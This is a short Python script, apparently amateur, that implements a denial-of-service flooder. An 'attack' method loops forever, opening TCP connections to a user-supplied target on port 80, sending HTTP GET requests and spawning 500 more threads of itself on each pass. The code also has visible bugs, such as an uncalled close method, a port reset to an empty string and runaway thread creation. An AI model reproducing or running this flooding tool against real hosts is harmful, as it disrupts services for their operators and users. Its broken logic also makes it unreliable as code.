import threading
import socket


target = '' #Can be any ipv4 Ip address
port =  80 #Depending on what you're trying to DDOS
proxy = ''


class DDOS():


  def attack():

      while True:
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((target, port))
          s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
          s.sendto(("Host: " + proxy + "\r\n\r\n").encode('ascii'), (target, port))
          s.close

          for i in range(500):
           thread = threading.Thread(target=DDOS.attack)
           thread.start()



  def ConnectionToServer():
    global server
    global port
    server = ''
    port = ''


    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.connect((server, port))




